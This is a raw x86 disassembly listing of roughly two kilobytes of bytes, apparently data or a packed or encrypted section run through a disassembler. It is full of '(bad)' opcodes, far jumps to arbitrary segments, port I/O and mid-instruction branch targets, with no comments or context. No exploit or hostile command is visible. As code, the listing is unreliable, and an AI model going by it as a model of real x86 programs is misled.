  4155c3:	xor    DWORD PTR [ebp+0x258d912c],0x756fc8b1
  4155cd:	aam    0x55
  4155cf:	pusha  
  4155d0:	jg     0x4155a0
  4155d2:	scas   al,BYTE PTR es:[edi]
  4155d3:	div    bh
  4155d5:	sub    ch,0xe3
  4155d8:	unpckhps xmm0,XMMWORD PTR [eax+0x7c]
  4155dc:	leave  
  4155dd:	retf   
  4155de:	(bad)  
  4155df:	stc    
  4155e0:	lahf   
  4155e1:	dec    ecx
  4155e2:	and    DWORD PTR [ebp+0xd],esp
  4155e5:	xchg   edx,eax
  4155e6:	mov    edx,DWORD PTR ds:0x4c3ca6a3
  4155ec:	push   cs
  4155ed:	adc    al,al
  4155ef:	sub    eax,0x26b1ae3b
  4155f4:	add    al,BYTE PTR [eax]
  4155f6:	jno    0x4155ea
  4155f8:	shl    DWORD PTR [esi],1
  4155fa:	add    ebx,DWORD PTR [ecx-0x64]
  4155fd:	aad    0x8e
  4155ff:	pop    edi
  415600:	jl     0x415656
  415602:	mov    BYTE PTR [ebp-0x53],ch
  415605:	mov    esi,0x49677a4f
  41560a:	jo     0x415646
  41560c:	test   eax,0xb2555d89
  415611:	loope  0x4155bc
  415613:	jae    0x4155f7
  415615:	aam    0x97
  415617:	call   0x78d8:0xc1eb6e07
  41561e:	mov    al,ds:0x5fee21de
  415623:	and    esp,DWORD PTR [edi-0x29]
  415626:	pop    eax
  415627:	call   0xe29405ce
  41562c:	ret    
  41562d:	add    BYTE PTR [eax],ah
  41562f:	int    0xed
  415631:	jle    0x4155d3
  415633:	xchg   esp,eax
  415634:	cmp    eax,0x8e6d8de5
  415639:	(bad)  
  41563a:	xchg   esi,eax
  41563b:	push   ss
  41563c:	pusha  
  41563d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41563e:	cmp    bh,BYTE PTR [edx+0x52]
  415641:	jnp    0x4155cb
  415643:	dec    ecx
  415644:	sub    BYTE PTR [ebx+esi*4+0x491fec00],dh
  41564b:	sbb    BYTE PTR [ebp+0x45172ba6],dl
  415651:	xor    al,0x25
  415653:	pusha  
  415654:	out    0xac,eax
  415656:	loope  0x4156cf
  415658:	mov    eax,ds:0xcae91d5e
  41565d:	ds sahf 
  41565f:	into   
  415660:	dec    esp
  415661:	daa    
  415662:	mov    dh,0xef
  415664:	mov    ah,0x58
  415666:	ds pop esp
  415668:	sbb    DWORD PTR [edi-0x20],esi
  41566b:	inc    edi
  41566c:	nop
  41566d:	mov    ecx,DWORD PTR [edx+0x4c]
  415670:	mov    dh,0xbe
  415672:	sbb    BYTE PTR [ebx-0x24d65d63],cl
  415678:	jae    0x4156cd
  41567a:	(bad)  
  41567b:	sbb    eax,0x66feae26
  415680:	(bad)  
  415681:	push   ss
  415682:	int3   
  415683:	retf   
  415684:	aas    
  415685:	xchg   edx,eax
  415686:	arpl   WORD PTR [edx],dx
  415688:	and    BYTE PTR ds:0x18afce7d,dl
  41568e:	and    BYTE PTR [ecx+eax*1-0x3d],ch
  415692:	pop    es
  415693:	mov    esp,0x4250d06a
  415698:	or     eax,0x987ce23
  41569d:	mov    ?,WORD PTR [ecx+0x2f48c884]
  4156a3:	dec    ecx
  4156a4:	lds    edx,FWORD PTR [ecx]
  4156a6:	jle    0x4156e5
  4156a8:	lock fwait
  4156aa:	stos   DWORD PTR es:[edi],eax
  4156ab:	jle    0x4156cb
  4156ad:	xchg   BYTE PTR [ecx+0x20],bl
  4156b0:	mov    esp,0xc4e6d980
  4156b5:	sub    cl,BYTE PTR [ebx]
  4156b7:	cmp    BYTE PTR [ecx+ebx*8],cl
  4156ba:	mov    ds:0x76b1a62d,eax
  4156bf:	test   DWORD PTR [ecx+0x356b6110],0x32831513
  4156c9:	and    eax,DWORD PTR ds:0x38859cfb
  4156cf:	or     DWORD PTR [ecx+edi*2+0x66],0xd76f5f1a
  4156d7:	and    DWORD PTR [esi-0x4dcdf7fe],0x563dc008
  4156e1:	in     al,0x16
  4156e3:	das    
  4156e4:	test   DWORD PTR [edx-0x73697ed3],edi
  4156ea:	shl    ch,0x54
  4156ed:	mov    esp,0xb0f178eb
  4156f2:	rcr    DWORD PTR [eax],1
  4156f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156f5:	into   
  4156f6:	out    dx,eax
  4156f7:	nop
  4156f8:	pop    ebx
  4156f9:	or     BYTE PTR [ebx],cl
  4156fb:	std    
  4156fc:	icebp  
  4156fd:	xor    ebp,DWORD PTR [esi+0x5b]
  415700:	inc    DWORD PTR [edi]
  415702:	cmp    edi,esp
  415704:	mov    ebp,0xead45341
  415709:	pop    esp
  41570a:	push   esp
  41570b:	jl     0x4156f9
  41570d:	pop    ds
  41570e:	inc    edx
  41570f:	je     0x41575b
  415711:	daa    
  415712:	cmp    DWORD PTR [esi+0x349d0db4],edx
  415718:	test   al,0x21
  41571a:	dec    ecx
  41571b:	inc    edx
  41571c:	sub    dl,bl
  41571e:	clc    
  41571f:	test   BYTE PTR [ecx-0x595f9cfb],dh
  415725:	push   edi
  415726:	jg     0x4156ed
  415728:	lds    ebx,FWORD PTR [ebx-0x63]
  41572b:	xchg   ebp,eax
  41572c:	(bad)  
  41572e:	jecxz  0x41570f
  415730:	shr    bh,0x26
  415733:	loope  0x41579a
  415735:	rcr    BYTE PTR [esi+0x597df5b1],1
  41573b:	out    0xc0,al
  41573d:	pop    ebx
  41573e:	les    ecx,FWORD PTR [ebx]
  415740:	arpl   WORD PTR [edi+0x73749055],bx
  415746:	jmp    0xf04e:0x93e027f8
  41574d:	mov    es,WORD PTR [edi+0x303afe4]
  415753:	loop   0x4156db
  415755:	mov    eax,ds:0x6d08b4c9
  41575a:	push   esp
  41575b:	dec    ecx
  41575c:	cmp    ebp,DWORD PTR [edi]
  41575e:	test   BYTE PTR [eax+0x513787a6],0x5e
  415765:	inc    edx
  415766:	mov    ah,0xaa
  415768:	xor    BYTE PTR [ecx],bh
  41576a:	int    0x1
  41576c:	dec    esi
  41576d:	adc    ecx,DWORD PTR [esi+0x18]
  415770:	sbb    edx,DWORD PTR [edx]
  415772:	cmp    BYTE PTR [edx],bh
  415774:	jne    0x415797
  415776:	xor    DWORD PTR [eax],edi
  415778:	das    
  415779:	call   0x759748f0
  41577e:	stc    
  41577f:	outs   dx,BYTE PTR ds:[esi]
  415780:	jb     0x41579c
  415782:	and    esp,DWORD PTR [eax+eiz*8+0x6a]
  415786:	mov    bh,0x12
  415788:	inc    esp
  415789:	ds pop eax
  41578b:	sub    DWORD PTR [ebx+0x4c],esp
  41578e:	xchg   ebx,eax
  41578f:	retf   
  415790:	aaa    
  415791:	jmp    0x415765
  415793:	fbld   TBYTE PTR [edi]
  415795:	push   ecx
  415796:	dec    edx
  415797:	out    0x87,al
  415799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41579a:	mov    bl,BYTE PTR [edx+0x7db9ff31]
  4157a0:	std    
  4157a1:	and    eax,0x11697d23
  4157a6:	cmp    eax,0x8280378b
  4157ab:	ror    BYTE PTR [ecx+0x79],cl
  4157ae:	pop    eax
  4157af:	push   ss
  4157b0:	scas   al,BYTE PTR es:[edi]
  4157b1:	enter  0x2f4,0xf
  4157b5:	xchg   DWORD PTR [esp+ebx*8+0x314c197a],edx
  4157bc:	lea    ebp,[ecx]
  4157be:	mov    ebx,DWORD PTR [esi]
  4157c0:	adc    al,0x26
  4157c2:	loope  0x415804
  4157c4:	adc    DWORD PTR [edi+0x2e],ebx
  4157c7:	in     eax,dx
  4157c8:	xchg   ebp,eax
  4157c9:	cli    
  4157ca:	jmp    0x9a74:0xdf8d9ff4
  4157d1:	push   esp
  4157d2:	cdq    
  4157d3:	clc    
  4157d4:	mov    ds:0xc9afc091,al
  4157d9:	cmp    al,dl
  4157db:	outs   dx,DWORD PTR ds:[esi]
  4157dc:	test   al,0x1d
  4157de:	pop    edi
  4157df:	popf   
  4157e0:	xor    DWORD PTR [edx+0x35],0xffffff9f
  4157e4:	jmp    0x415784
  4157e6:	xchg   ebx,eax
  4157e7:	je     0x41583a
  4157e9:	jmp    0x21f9:0x6fd65117
  4157f0:	sbb    eax,0x56eb282b
  4157f5:	jns    0x41585b
  4157f7:	out    dx,al
  4157f8:	mov    ebx,0xfa8aa836
  4157fd:	mov    dl,0x22
  4157ff:	mov    eax,ds:0x6048e14d
  415804:	stc    
  415805:	loopne 0x4157e2
  415807:	mov    esp,0x62e6dfe2
  41580c:	in     al,dx
  41580d:	les    ecx,FWORD PTR [edx+edi*8-0x29]
  415811:	add    DWORD PTR [edx],edx
  415813:	(bad)  
  415814:	mov    eax,0xe7541386
  415819:	fs push edx
  41581b:	sub    DWORD PTR [esi],ecx
  41581d:	repz bound edx,QWORD PTR [ecx]
  415820:	add    al,0x7f
  415822:	(bad)  
  415823:	adc    eax,0xe39f4b3f
  415828:	mov    ecx,0x94a57516
  41582d:	mov    cl,0x61
  41582f:	loop   0x415828
  415831:	sbb    eax,0xc72a04cd
  415836:	stos   DWORD PTR es:[edi],eax
  415837:	lock add dh,cl
  41583a:	push   0x74
  41583c:	sbb    BYTE PTR [edi+0x47e24e62],bh
  415842:	inc    esp
  415843:	sbb    al,0x76
  415845:	jp     0x41582d
  415847:	cli    
  415848:	push   eax
  415849:	and    al,0x42
  41584c:	(bad)  
  41584d:	fucomp st(6)
  41584f:	or     esp,DWORD PTR [ebx-0x5a]
  415852:	in     al,dx
  415853:	sub    ebx,esp
  415855:	push   edi
  415856:	push   edi
  415857:	and    DWORD PTR [ecx-0x67492a9f],edi
  41585d:	add    eax,DWORD PTR [esi]
  41585f:	(bad)  
  415860:	fsubr  DWORD PTR [ecx+0x20]
  415863:	dec    edx
  415864:	mov    ah,0xe9
  415866:	adc    DWORD PTR [ebx-0x31],0x1cd6e516
  41586d:	out    dx,al
  41586e:	dec    ebx
  41586f:	ror    DWORD PTR [esi-0x76],0x5c
  415873:	shl    DWORD PTR [ecx-0x726a2bd7],0x51
  41587a:	xchg   ecx,eax
  41587b:	sub    ebp,DWORD PTR [edx-0x56]
  41587e:	aas    
  41587f:	xor    esi,DWORD PTR [ebp+0x67]
  415882:	out    dx,eax
  415883:	fdivr  DWORD PTR [edi]
  415885:	scas   al,BYTE PTR es:[edi]
  415886:	cwde   
  415887:	jnp    0x41586b
  415889:	mov    ds:0xd1bcb16a,eax
  41588e:	stos   BYTE PTR es:[edi],al
  41588f:	fcos   
  415891:	ja     0x41588e
  415893:	or     bh,BYTE PTR [eax+edx*1+0x5f]
  415897:	jle    0x41584e
  415899:	gs inc edi
  41589b:	mov    BYTE PTR [eax-0x3ef5300b],dl
  4158a1:	cmp    al,0x25
  4158a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a4:	repnz and edx,ebx
  4158a7:	push   es
  4158a8:	fisubr DWORD PTR [eax]
  4158aa:	dec    ecx
  4158ab:	push   es
  4158ac:	sub    ebp,DWORD PTR [ecx]
  4158ae:	mov    eax,0x2dc0b53b
  4158b3:	sbb    ebx,ecx
  4158b5:	xchg   ah,dl
  4158b7:	sti    
  4158b8:	(bad)  
  4158ba:	sub    al,0xb9
  4158bc:	jmp    0x7c23:0x6dbcc2f8
  4158c3:	popa   
  4158c4:	mov    BYTE PTR cs:0x4691e7e9,dh
  4158cb:	mov    dl,0x10
  4158cd:	test   DWORD PTR ss:[esi-0x4ee381],esi
  4158d4:	sbb    BYTE PTR [edx],dh
  4158d6:	or     eax,0x2382e6fe
  4158db:	mov    ch,0x99
  4158dd:	pop    edx
  4158de:	repnz mov ebx,0x878a2905
  4158e4:	mov    bh,0xc6
  4158e6:	and    dh,BYTE PTR [ecx]
  4158e8:	stos   BYTE PTR es:[edi],al
  4158e9:	dec    esp
  4158ea:	das    
  4158eb:	mov    bl,0x92
  4158ed:	mov    WORD PTR [edi-0x25c3dfc9],ss
  4158f3:	js     0x415883
  4158f5:	adc    edx,esi
  4158f7:	ret    0x6755
  4158fa:	popa   
  4158fb:	sub    esp,DWORD PTR [esi-0x38a4278d]
  415901:	scas   eax,DWORD PTR es:[edi]
  415902:	sbb    al,0xec
  415904:	adc    ch,BYTE PTR [edx-0x3e]
  415907:	pushf  
  415908:	add    DWORD PTR [ecx],edi
  41590a:	sbb    al,0x3a
  41590c:	mov    ch,0x50
  41590e:	iret   
  41590f:	pop    ds
  415910:	jnp    0x4158b5
  415912:	jmp    0x41598c
  415914:	shr    ebx,1
  415916:	xchg   BYTE PTR [ecx+0x6f],bh
  415919:	xor    eax,0x715c1500
  41591e:	dec    BYTE PTR [esi-0x32]
  415921:	bound  ebx,QWORD PTR [ebp-0x1954ebba]
  415927:	jae    0x41599b
  415929:	scas   al,BYTE PTR es:[edi]
  41592a:	dec    edx
  41592b:	repnz rcl cl,1
  41592e:	je     0x4158f0
  415930:	lods   al,BYTE PTR ds:[esi]
  415931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415933:	mov    ecx,0xce2b770f
  415938:	and    BYTE PTR [ebx+ebx*2-0x43],bl
  41593c:	mov    edx,0x4f9a5800
  415941:	adc    al,0x17
  415943:	dec    esi
  415944:	js     0x41596e
  415946:	mov    ebx,0x61efaf3b
  41594b:	mov    eax,ds:0x849c3ad
  415950:	cmp    eax,0xe44ed59a
  415955:	or     dh,BYTE PTR [ebp+0x553c9a1e]
  41595b:	out    0xcd,eax
  41595d:	dec    ebx
  41595e:	popa   
  41595f:	cwde   
  415960:	add    bh,al
  415962:	xchg   edx,eax
  415963:	fwait
  415964:	xchg   edi,eax
  415965:	aam    0x8c
  415967:	cmc    
  415968:	jmp    FWORD PTR [ecx+0x440517ea]
  41596e:	dec    eax
  41596f:	addr16 int 0x90
  415972:	shr    BYTE PTR [edi+0x49a39ffd],0x8b
  415979:	inc    esp
  41597a:	pop    ds
  41597b:	fist   DWORD PTR [edx-0x7e]
  41597e:	xchg   esi,ebx
  415980:	sub    DWORD PTR [ebp+0x56],esp
  415983:	retf   0x31fd
  415986:	dec    edx
  415987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415989:	pop    ebp
  41598a:	imul   esp,DWORD PTR [edi-0x27dff369],0x63834041
  415994:	mov    edx,0x443a5a42
  415999:	xlat   BYTE PTR ds:[ebx]
  41599a:	call   0x4ef2f059
  41599f:	(bad)  
  4159a1:	cmp    BYTE PTR [edx],0x34
  4159a4:	jg     0x415937
  4159a6:	sub    eax,0x10272fc2
  4159ab:	clc    
  4159ac:	cmp    eax,0xc5d143b7
  4159b1:	call   0xb06b:0x8b2bed86
  4159b8:	jbe    0x4159c6
  4159ba:	mov    ecx,0xf31d9096
  4159bf:	into   
  4159c0:	jae    0x4159a9
  4159c2:	mov    al,ds:0x1d4da0b8
  4159c7:	mov    ?,WORD PTR [edi]
  4159c9:	mov    esi,0xfa7c2ad4
  4159ce:	jl     0x4159a9
  4159d0:	sbb    BYTE PTR [edi-0x43],0xad
  4159d4:	(bad)  
  4159d5:	sbb    al,0x28
  4159d7:	popa   
  4159d8:	(bad)  
  4159d9:	xor    eax,DWORD PTR [edi+0x5f4a0c63]
  4159df:	xchg   edi,eax
  4159e0:	jecxz  0x4159f7
  4159e2:	test   bl,0x9e
  4159e5:	jns    0x415a28
  4159e7:	cmp    al,0x9c
  4159e9:	(bad)  
  4159ea:	xor    BYTE PTR [ecx+0x5c],al
  4159ed:	retf   
  4159ee:	cs aam 0x61
  4159f1:	sbb    al,0xb7
  4159f3:	std    
  4159f4:	xlat   BYTE PTR ds:[ebx]
  4159f5:	das    
  4159f6:	dec    edi
  4159f7:	ins    BYTE PTR es:[edi],dx
  4159f8:	push   0x223dd0d2
  4159fd:	xlat   BYTE PTR ds:[ebx]
  4159fe:	dec    edx
  4159ff:	popa   
  415a00:	shl    BYTE PTR [eax-0x18d78ee5],0xf0
  415a07:	jmp    0xd943f884
  415a0c:	sbb    ch,BYTE PTR [ecx+edx*1-0x19]
  415a10:	xchg   DWORD PTR [esi+0x2eb656ec],edi
  415a16:	stos   DWORD PTR es:[edi],eax
  415a17:	mov    bh,0xb4
  415a19:	shl    DWORD PTR [edx],cl
  415a1b:	and    DWORD PTR [edx+edi*2],0x1c
  415a1f:	add    esi,0x3464b19d
  415a25:	sahf   
  415a26:	ret    
  415a27:	adc    al,0x9d
  415a29:	mov    edi,DWORD PTR [edx-0x7b]
  415a2c:	pop    edi
  415a2d:	or     ch,BYTE PTR [edi-0x192b8973]
  415a33:	and    DWORD PTR [ebx+0x3d],esp
  415a36:	sbb    ecx,edi
  415a38:	inc    edx
  415a39:	dec    edi
  415a3a:	enter  0x7a54,0x6f
  415a3e:	pop    eax
  415a3f:	mov    DWORD PTR [edx*8+0x4334c88d],esp
  415a46:	add    al,al
  415a48:	or     al,0x8e
  415a4a:	jbe    0x415a7d
  415a4c:	cmp    DWORD PTR [edi-0x65],esi
  415a4f:	add    eax,0x400e982e
  415a54:	les    esi,FWORD PTR [edx+0x6a]
  415a57:	pop    esi
  415a58:	xlat   BYTE PTR ds:[ebx]
  415a59:	pop    ebp
  415a5a:	adc    BYTE PTR [eax+0x2d89fac0],al
  415a60:	push   ecx
  415a61:	xor    ch,bh
  415a63:	adc    al,0xdd
  415a65:	mov    edx,DWORD PTR [ecx]
  415a67:	or     ebx,DWORD PTR [esi-0x22]
  415a6a:	and    al,0xe2
  415a6c:	jg     0x415a13
  415a6e:	pushf  
  415a6f:	pop    edi
  415a70:	jl     0x415a65
  415a72:	(bad)  
  415a73:	int    0xf9
  415a75:	in     eax,dx
  415a76:	adc    al,0xf6
  415a78:	(bad)  
  415a79:	aam    0x67
  415a7b:	cmp    al,ch
  415a7d:	js     0x415ade
  415a7f:	mov    dh,0x20
  415a81:	pushf  
  415a82:	call   0x38d4:0x1bd5ef3e
  415a89:	or     BYTE PTR [ecx],cl
  415a8b:	lock inc eax
  415a8d:	jge    0x415ab2
  415a8f:	ins    DWORD PTR es:[edi],dx
  415a90:	test   al,0x76
  415a92:	xchg   edx,eax
  415a93:	or     BYTE PTR [ebx],cl
  415a95:	push   edi
  415a96:	adc    eax,0xa1cbc9ab
  415a9b:	cmp    al,0xcf
  415a9d:	mov    dh,0xc5
  415a9f:	push   ecx
  415aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aa1:	outs   dx,BYTE PTR ds:[esi]
  415aa2:	pop    edi
  415aa3:	repnz dec edx
  415aa5:	lods   eax,DWORD PTR ds:[esi]
  415aa6:	icebp  
  415aa7:	in     al,0x13
  415aa9:	ins    DWORD PTR es:[edi],dx
  415aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aab:	scas   eax,DWORD PTR es:[edi]
  415aac:	mov    cl,0xe5
  415aae:	mov    ah,0xd8
  415ab0:	push   edx
  415ab1:	jo     0x415b0c
  415ab3:	retf   
  415ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ab5:	and    DWORD PTR [esi-0x70bfe97e],edi
  415abb:	lahf   
  415abc:	pop    ecx
  415abd:	sbb    eax,0x2fc2340d
  415ac2:	loop   0x415aee
  415ac4:	pushf  
  415ac5:	popf   
  415ac6:	clc    
  415ac7:	sbb    al,0xe1
  415ac9:	sub    dh,cl
  415acb:	adc    bh,BYTE PTR [edx-0x74b4ed11]
  415ad1:	dec    esi
  415ad2:	cmp    al,0x74
  415ad4:	fwait
  415ad5:	mov    edi,esi
  415ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ad8:	mov    esi,0xda501859
  415add:	xor    eax,DWORD PTR [edx]
  415adf:	lods   eax,DWORD PTR ds:[esi]
  415ae0:	or     BYTE PTR [esi],ch
  415ae2:	dec    ecx
  415ae3:	or     DWORD PTR [ebx+0xb73d93b],esp
  415ae9:	cmp    al,0x1
  415aeb:	retf   0x4a0e
  415aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aef:	ds xchg edx,eax
  415af1:	add    DWORD PTR [edi],esi
  415af3:	ss aas 
  415af5:	jbe    0x415ae6
  415af7:	or     al,0x14
  415af9:	out    0x6b,al
  415afb:	dec    esi
  415afc:	xchg   DWORD PTR [ebp-0x46cfd81f],edi
  415b02:	mov    ds,WORD PTR [ebp-0x1]
  415b05:	outs   dx,BYTE PTR ds:[esi]
  415b06:	jle    0x415b03
  415b08:	xchg   ebx,eax
  415b09:	mov    edx,0x7e3b7446
  415b0e:	xchg   ebp,eax
  415b0f:	pop    ss
  415b10:	mov    ecx,0x4d4a667d
  415b15:	test   eax,0x6388feb0
  415b1a:	xlat   BYTE PTR ds:[ebx]
  415b1b:	and    al,0x80
  415b1d:	sub    DWORD PTR [ebx-0x681f081],esp
  415b23:	mov    ecx,eax
  415b25:	mov    WORD PTR [esp+ecx*8-0x70a6cd6a],?
  415b2c:	jae    0x415acb
  415b2e:	je     0x415b1d
  415b30:	inc    ebx
  415b31:	sbb    al,dl
  415b33:	cmp    dh,BYTE PTR [ebp+0x28]
  415b36:	addr16 (bad) 
  415b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b39:	or     DWORD PTR [esi-0x59],ebp
  415b3c:	popf   
  415b3d:	cdq    
  415b3e:	adc    edx,ebx
  415b40:	mov    ds:0x501df0f0,al
  415b45:	push   esp
  415b46:	add    al,0x6e
  415b48:	repnz in eax,0x43
  415b4b:	mov    DWORD PTR [ebx+ebp*8+0x6b],esp
  415b4f:	lea    esp,[edi+esi*4+0x2]
  415b53:	xchg   edx,eax
  415b54:	lock ins BYTE PTR es:[edi],dx
  415b56:	xor    cl,BYTE PTR [ebx]
  415b58:	xchg   ebp,eax
  415b59:	jl     0x415b7f
  415b5b:	pop    esi
  415b5c:	xlat   BYTE PTR ds:[ebx]
  415b5d:	js     0x415bbf
  415b5f:	jb     0x415b44
  415b61:	jg     0x415afd
  415b63:	push   esi
  415b64:	jmp    0x415b74
  415b66:	cld    
  415b67:	xor    edi,DWORD PTR [ebp-0x33]
  415b6a:	jge    0x415b3e
  415b6c:	nop
  415b6d:	jmp    0x415b83
  415b6f:	in     al,0x88
  415b71:	in     eax,dx
  415b72:	imul   esi,ecx,0x72671dbf
  415b78:	sar    ah,1
  415b7a:	std    
  415b7b:	jne    0x415bbc
  415b7d:	sub    ah,BYTE PTR [esi+0x10]
  415b80:	jl     0x415bf9
  415b82:	ins    BYTE PTR es:[edi],dx
  415b83:	into   
  415b84:	push   ds
  415b85:	icebp  
  415b86:	pop    ss
  415b87:	sbb    BYTE PTR [eax-0x6],0x67
  415b8b:	cmp    al,0x6c
  415b8d:	mov    cl,0x79
  415b8f:	out    dx,eax
  415b90:	jne    0x415bb7
  415b92:	fucomip st,st(2)
  415b94:	ret    
  415b95:	xor    ebp,DWORD PTR [esi+0x3]
  415b98:	inc    edx
  415b99:	or     al,0x2d
  415b9b:	scas   eax,DWORD PTR es:[edi]
  415b9c:	sbb    al,0xe7
  415b9e:	repz in eax,dx
  415ba0:	imul   ebx,ebp,0xd1724e34
  415ba6:	mov    ecx,0xd0e9d888
  415bab:	jbe    0x415ba5
  415bad:	aaa    
  415bae:	cmp    DWORD PTR [eax+eiz*8],eax
  415bb1:	sahf   
  415bb2:	sub    BYTE PTR [eax-0x25],bh
  415bb5:	mov    bh,0x18
  415bb7:	sbb    al,0x55
  415bb9:	dec    eax
  415bba:	(bad)  
  415bbb:	dec    ebp
  415bbc:	fwait
  415bbd:	(bad)  
  415bbe:	sub    edx,ecx
  415bc0:	outs   dx,DWORD PTR ds:[esi]
  415bc1:	repz cld 
  415bc3:	gs push edx
  415bc5:	adc    edi,0xd9a9e76e
  415bcb:	jl     0x415bd3
  415bcd:	shl    DWORD PTR [ebp+0x2d3138ef],1
  415bd3:	sbb    esp,DWORD PTR ss:[edx+0x1dbb5307]
  415bda:	test   eax,0xfdb3d927
  415bdf:	sub    DWORD PTR [ecx+0x7430a6e2],ebp
  415be5:	shl    DWORD PTR [eax],cl
  415be7:	mov    bh,0x83
  415be9:	push   esi
  415bea:	aad    0x43
  415bec:	xchg   esi,eax
  415bed:	repz cmp al,0xac
  415bf0:	imul   ecx,edi,0x6
  415bf3:	arpl   WORD PTR [ecx+0x2e35cd34],bx
  415bf9:	inc    esi
  415bfa:	sub    eax,0x856ed065
  415bff:	mov    ebx,0xcc1d3415
  415c04:	adc    DWORD PTR [edi],ebx
  415c06:	mov    ecx,0x9ed3561f
  415c0b:	add    ebp,DWORD PTR [esi+0x58c43550]
  415c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c12:	mov    edx,0x74bdc735
  415c17:	push   esi
  415c18:	(bad)  
  415c1b:	xor    al,0x95
  415c1d:	add    BYTE PTR [esi+edx*2+0x7da46dea],ch
  415c24:	push   ebp
  415c25:	loope  0x415c05
  415c27:	cmp    eax,0x98de337f
  415c2c:	scas   eax,DWORD PTR es:[edi]
  415c2d:	mov    ecx,0xb91b950f
  415c32:	push   cs
  415c33:	push   eax
  415c34:	loopne 0x415bec
  415c36:	push   esp
  415c37:	loop   0x415be8
  415c39:	mov    ebp,0x601c4cc3
  415c3e:	fwait
  415c3f:	test   DWORD PTR [ecx-0x3fe75d9c],ecx
  415c45:	aaa    
  415c46:	xchg   ecx,eax
  415c47:	hlt    
  415c48:	pusha  
  415c49:	fsubrp st(3),st
  415c4b:	cmc    
  415c4c:	mov    bl,0xd9
  415c4e:	add    eax,0x972e27e6
  415c53:	mov    ebp,0xf508baa5
  415c58:	jp     0x415be8
  415c5a:	into   
  415c5b:	rcr    DWORD PTR [ecx+0x5a],cl
  415c5e:	ja     0x415c2a
  415c60:	pop    edi
  415c61:	jbe    0x415cc3
  415c63:	das    
  415c64:	out    0x93,al
  415c66:	jmp    0x257d2f9e
  415c6b:	add    ebp,DWORD PTR [esi-0x4a]
  415c6e:	popf   
  415c6f:	loop   0x415cb4
  415c71:	and    DWORD PTR [esi-0x17e541c3],esp
  415c77:	loop   0x415c69
  415c79:	jp     0x415ce1
  415c7b:	call   0xd2f:0x2aa00883
  415c82:	stc    
  415c83:	jp     0x415c33
  415c85:	push   es
  415c86:	int3   
  415c87:	xlat   BYTE PTR ds:[ebx]
  415c88:	pushf  
  415c89:	mov    esi,esi
  415c8b:	xchg   ebx,eax
  415c8c:	sub    al,0x23
  415c8e:	inc    ecx
  415c8f:	cmp    bh,BYTE PTR [esi+0x3f]
  415c92:	arpl   WORD PTR [ecx],sp
  415c94:	sub    eax,0xf9dd73a7
  415c99:	or     BYTE PTR [ebx+0x15],dh
  415c9c:	push   esi
  415c9d:	jg     0x415cf9
  415c9f:	cmp    BYTE PTR [eax+esi*2-0x43ccd496],dl
  415ca6:	mov    esp,0xb3424b7a
  415cab:	(bad)  
  415cac:	repz rol DWORD PTR [edx+edx*2+0x0],1
  415cb1:	push   cs
  415cb2:	jge    0x415cb1
  415cb4:	aad    0xd5
  415cb6:	retf   0xdf13
  415cb9:	sub    al,0x29
  415cbb:	scas   eax,DWORD PTR es:[edi]
  415cbc:	push   es
  415cbd:	mul    ecx
  415cbf:	jmp    0x48d3:0x5b964092
  415cc6:	sbb    eax,DWORD PTR [esi-0x17]
  415cc9:	adc    BYTE PTR [esi+eax*4-0x8],0x53
  415cce:	adc    edx,DWORD PTR [eax-0x4b]
  415cd1:	dec    eax
  415cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cd3:	and    ch,ch
  415cd5:	xchg   ecx,eax
  415cd6:	out    0xfb,al
  415cd8:	jmp    0x6593493e
  415cdd:	loope  0x415d3f
  415cdf:	mov    DWORD PTR [edi],ecx
  415ce1:	sub    DWORD PTR [edi+0x70088536],0x6520998b
  415ceb:	fadd   st(0),st
  415ced:	fadd   DWORD PTR [edi-0x22]
  415cf0:	scas   al,BYTE PTR es:[edi]
  415cf1:	cld    
  415cf2:	xor    esp,ebp
  415cf4:	cmp    esp,DWORD PTR [ebx]
  415cf6:	jmp    0xdaa2b2cb
  415cfb:	mov    ebp,0x1b1d24e9
  415d00:	adc    al,0x6c
  415d02:	inc    ecx
  415d03:	dec    ebp
  415d04:	imul   edx,esi,0xffffffee
  415d07:	sahf   
  415d08:	or     dl,BYTE PTR [edx+0x2cea9a70]
  415d0e:	ror    BYTE PTR [eax+0x47e27496],0x72
  415d15:	out    dx,eax
  415d16:	out    dx,eax
  415d17:	jbe    0x415d77
  415d19:	add    eax,0xfa7d54b6
  415d1e:	xchg   ecx,eax
  415d1f:	jo     0x415cb9
  415d21:	push   ebp
  415d22:	mov    dl,0x94
  415d24:	mov    WORD PTR [ebx+0x3f],fs
  415d27:	stc    
  415d28:	mov    ecx,0x18d71c8e
  415d2d:	push   ebx
  415d2e:	movq   mm5,mm1
  415d31:	aaa    
  415d32:	fmul   DWORD PTR [ebx]
  415d34:	ss popa 
  415d36:	in     eax,dx
  415d37:	in     eax,0xa5
  415d39:	add    DWORD PTR [edx-0x589637b8],ecx
  415d3f:	jne    0x415d4e
  415d41:	cmp    ebp,DWORD PTR [ebx]
  415d43:	in     al,0xfc
  415d45:	xor    esp,DWORD PTR [ebp-0x53]
  415d48:	into   
  415d49:	add    esi,DWORD PTR [ebx]
  415d4b:	test   DWORD PTR [edx],0x822d338f
  415d51:	xchg   DWORD PTR cs:[ecx],edx
  415d54:	nop
  415d55:	jecxz  0x415cf7
  415d57:	xchg   ecx,eax
  415d58:	fadd   DWORD PTR [edx]
  415d5a:	pop    edi
  415d5b:	jnp    0x415cfa
  415d5d:	rol    esp,0xe5
  415d60:	imul   edi,edi,0x30446a13
  415d66:	mov    dl,0x8a
  415d68:	repnz push ebp
  415d6a:	inc    esi
  415d6b:	sti    
